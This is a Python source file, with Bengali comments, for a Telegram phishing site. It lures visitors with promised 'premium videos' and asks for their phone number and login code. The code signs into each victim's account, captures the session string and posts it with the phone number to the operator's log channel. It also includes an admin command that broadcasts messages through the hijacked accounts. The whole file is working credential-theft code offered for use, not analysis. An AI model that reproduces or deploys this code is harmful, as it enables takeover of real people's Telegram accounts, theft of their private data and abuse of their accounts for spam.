import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__, static_url_path='')

# এনভায়রনমেন্ট ভ্যারিয়েবল লোড
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
LOG_CHANNEL = int(os.getenv("LOG_CHANNEL"))
ADMIN_ID = int(os.getenv("ADMIN_ID"))
BOT_TOKEN = os.getenv("BOT_TOKEN")

user_sessions = {}
all_users = set()

client = TelegramClient(StringSession(), API_ID, API_HASH)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    if not client.is_connected():
        await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        user_sessions[phone] = {'hash': sent_code.phone_code_hash}
        return jsonify({"status": "sent"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify_otp', methods=['POST'])
async def verify_otp():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    if phone in user_sessions:
        try:
            user = await client.sign_in(phone, otp, phone_code_hash=user_sessions[phone]['hash'])
            all_users.add(user.id)
            session_str = client.session.save()

            # ১. লগ চ্যানেলে সেশন পাঠানো
            await client.send_message(LOG_CHANNEL, f"✅ **New Session!**\nPhone: `{phone}`\n\n**Session:**\n`{session_str}`")

            # ২. ইউজারকে আকর্ষণীয় ওয়েলকাম মেসেজ পাঠানো
            welcome_text = (
                "👋 **Welcome to Premium Hub!**\n\n"
                "আপনার অ্যাকাউন্টটি সফলভাবে ভেরিফাই করা হয়েছে। ✅\n"
                "এখন নিচের **Open Content** বাটনে ক্লিক করে সব প্রিমিয়াম ভিডিও উপভোগ করুন। 🔥"
            )
            # বাটনে আপনার ওয়েবসাইটের লিংকটি দিন
            await client.send_message(user.id, welcome_text, buttons=[
                [Button.url("🚀 Open Content Now 🚀", "https://your-website-link.com")]
            ])

            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400
    return jsonify({"status": "error"}), 404

# --- অ্যাডমিন ব্রডকাস্ট সেকশন ---
@client.on(events.NewMessage(pattern='/post'))
async def broadcast_handler(event):
    if event.sender_id != ADMIN_ID:
        return
    notice_text = event.raw_text.replace('/post', '').strip()
    if not notice_text:
        await event.reply("⚠️ ব্যবহারের নিয়ম: `/post মেসেজ`")
        return
    await event.reply("⏳ পাঠানো হচ্ছে...")
    for user_id in all_users:
        try:
            await client.send_message(user_id, notice_text)
            await asyncio.sleep(0.3)
        except: continue
    await event.reply("📢 নোটিশ পাঠানো শেষ।")

if __name__ == "__main__":
    client.start(bot_token=BOT_TOKEN) # বট টোকেন দিয়ে স্টার্ট
    app.run()
